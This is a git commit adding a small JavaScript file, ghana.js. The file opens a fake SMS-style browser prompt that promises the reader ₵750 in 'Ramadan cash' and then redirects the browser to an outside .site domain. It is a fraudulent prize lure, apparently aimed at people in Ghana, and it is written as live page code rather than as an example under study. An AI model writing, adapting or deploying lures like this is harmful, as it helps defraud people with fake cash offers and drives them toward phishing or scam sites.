3ddcc4540a310b7259d9efd2adc31758a95177d8
usorondo81 <bassos-07.utility@icloud.com>
2026-03-06 14:19:31 +0100

    Create ghana.js

---
+++ ghana.js
@@ -0,0 +1,8 @@
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₵750. Please press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://www.ufofobitid.site/750-mahamudu-ramadan-cash';
+}
